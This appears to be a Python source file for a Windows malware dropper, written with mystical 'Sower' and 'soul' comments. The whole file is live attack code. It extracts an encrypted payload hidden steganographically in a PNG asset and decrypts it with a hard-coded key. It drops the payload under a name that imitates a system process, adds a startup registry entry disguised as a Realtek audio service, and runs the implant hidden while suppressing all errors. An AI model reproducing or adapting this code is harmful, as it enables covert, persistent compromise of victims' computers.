import threading
import os
import sys
import zlib
import base64
import subprocess
from cryptography.fernet import Fernet
from PIL import Image

# --- PERSISTENCE CONFIGURATION ---
APPDATA_PATH = os.getenv('LOCALAPPDATA')
PERSISTENT_NAME = "audiodg.pyw"
PERSISTENT_PATH = os.path.join(APPDATA_PATH, PERSISTENT_NAME)

def sow_and_awaken_implant():
    """
    This is the Sower's sacred duty. It is now intelligent.
    It will only plant the seed ONCE.
    It will always try to awaken the soul if it is not already running.
    """
    try:
        # --- RITUAL 1: PLANT THE SEED (ONLY IF NEEDED) ---
        if not os.path.exists(PERSISTENT_PATH):
            # The implant is not planted. We must perform the full ritual.
            # --- THE DIVINE KEY ---
            divine_key = b'oU9GO_1eFM-MOPteWxEJ8ZpP9cRrq3ayJLa39Vn0B_0='
            # --------------------

            # --- SOUL EXTRACTION ---
            if hasattr(sys, 'frozen'): base_path = sys._MEIPASS
            else: base_path = os.path.dirname(os.path.abspath(__file__))
            image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
            img = Image.open(image_path).convert('RGBA')
            pixels = img.load()
            width, height = img.size
            payload_bits = ""
            header_bits_to_read = 32
            payload_len = None
            bits_read = 0
            # ... (The rest of the extraction code is the same)
            for y in range(height):
                for x in range(width):
                    r, g, b, a = pixels[x, y]
                    for channel_val in [r, g, b, a]:
                        payload_bits += str(channel_val & 1)
                        bits_read += 1
                        if payload_len is None and bits_read == header_bits_to_read:
                            header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                            payload_len = int.from_bytes(header_bytes, 'big')
                        if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)): break
            final_payload_bits = payload_bits[header_bits_to_read:]
            payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
            encrypted_payload = base64.b64decode(payload_bytes)
            cipher_suite = Fernet(divine_key)
            compressed_payload = cipher_suite.decrypt(encrypted_payload)
            soul_code = zlib.decompress(compressed_payload)

            # Write the extracted soul code to the hidden implant file.
            with open(PERSISTENT_PATH, 'wb') as f: f.write(soul_code)

            # Add the implant to the startup registry key.
            import winreg
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
            command = f'pythonw.exe "{PERSISTENT_PATH}"'
            winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
            winreg.CloseKey(registry_key)

        # --- RITUAL 2: AWAKEN THE SOUL (ALWAYS) ---
        # Now that we are sure the implant exists, we check if it's already running.
        # We check by looking for the pythonw.exe process running our script.
        implant_running = False
        try:
            # This command lists processes and we search for our script's name in it.
            tasks = subprocess.check_output(['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V']).decode('utf-8', errors='ignore')
            if PERSISTENT_NAME in tasks:
                implant_running = True
        except Exception:
            pass # If tasklist fails, we assume it's not running just to be safe.
        
        # If the implant is NOT running, we awaken it.
        if not implant_running:
            command = f'pythonw.exe "{PERSISTENT_PATH}"'
            subprocess.Popen(command, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)

    except Exception:
        # The Sower remains silent if its ritual fails.
        pass

# --- INVOCATION OF THE SOWER ---
# The Sower's ritual is still run in a separate thread.
sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
sower_thread.start()